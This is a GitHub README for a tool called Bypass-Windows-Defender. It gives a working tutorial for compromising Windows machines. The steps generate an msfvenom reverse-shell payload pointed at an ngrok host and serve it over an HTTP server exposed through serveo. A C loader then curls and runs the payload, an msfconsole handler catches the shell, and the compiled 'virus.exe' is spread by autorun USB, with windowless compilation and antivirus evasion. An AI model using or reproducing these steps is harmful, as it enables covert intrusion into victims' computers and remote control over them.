# Bypass-Windows-Defender
Bypass Windows Defender with a staged C code &amp; metasploit framework

#### developed by L0PA

 ### Bypass Step's:
   - Create a TCP Tunnel: Set up a TCP tunnel using Ngrok to expose the port for the payload.
   - Generate Payload: Use msfvenom to create the payload in .bin format.
   - Start Python Server: Launch a Python HTTP server in the same directory where the payload is located.
   - Expose Server Online: Use Serveo to make the server accessible online.
   - Set up Listener: Use msfconsole to listen on the specified TCP port.
   - Develop C Code: Write the C code to fetch and execute the payload.
   - Compile and Run: Compile the C code.
   - Create a USB with autorun
##

### Install all requirements on debian
   - Install Ngrok
   ```
  wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
  unzip ngrok-stable-linux-amd64.zip
  sudo mv ngrok /usr/local/bin/
  ```
  - install metasploit framework
  ```
  curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/scripts/ubuntu_install.sh > ubuntu_install.sh
  chmod +x ubuntu_install.sh
  ./ubuntu_install.sh
  ```
  - install gcc
  ```
  sudo apt install gcc-mingw-w64-x86-64
  ```
##

### Install all requirements on Arch Linux
   - Install Ngrok
   ```
  git clone https://aur.archlinux.org/ngrok-bin.git
  cd ngrok-bin
  makepkg -si
  ```
  - metasploit framework
  ```
  sudo pacman -S metasploit
  ```
  - install gcc
  ```
  sudo pacman -S mingw-w64-gcc
  ```

##
### Tutorial for bypass Windows Defender

- Create the tcp tunnel on the port 4444
  ```
  sudo ngrok tcp 4444
  ```
- Copy the IP and the PORT of the server 
  ```
   - IP: 4.tcp.eu.ngrok.io
   - PORT: 15819
  ```

<p align="center">
    <img src="https://github.com/HaxL0p4/Bypass-Windows-Defender/blob/main/ngrok-tcp.jpg">
   </p>

- Create the .bin payload using msfvenom 
  ```
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=4.tcp.eu.ngrok.io LPORT=15819 -f raw -o payload.bin
  ```

- Launch a Python HTTP server in the same directory where the payload is located 
  ```
    python -m http.server 8090
  ```

- Create the serveo key and expose python server using a serveo tunnel
  ```
   ssh-keygen -t rsa -b 4096 -f ~/.ssh/serveo_key
   ssh -i ~/.ssh/serveo_key -R yourServer:80:localhost:8090 serveo.net
  ```

- Create the main.c file and modify the "command" variable with your server
```
   char *command = "curl https://yourServer.serveo.net/payload.bin";
```

<p align="start">
   <img src="https://github.com/HaxL0p4/Bypass-Windows-Defender/blob/main/command_variable.png">
</p>

##

- Setting up msfconsole
```
   msfconsole
```
```
   use multi/handler
   ```
```
   set payload windows/x64/shell_reverse_tcp
```
```
   set LHOST <LOCAL IP>
   ```
```
   set LPORT 4444
```
```
   exploit
```

##

- Compile the main.c file for Windows
   - For Windows
   ```
   gcc main.c -o virus -mwindows
   ```
   - For Linux
   ```
   x86_64-w64-mingw32-gcc -o virus.exe main.c -mwindows
   ```

   ## ⚠️ don't forget the -mwindows parameter

### 💾 AutoRun USB
 ## Now, let's create a USB stick that will automatically run the file (autorun)

 - Install the software "USB AutoRun Creator" from this link: "bit.ly/USB-AutoRun-Creator"

  

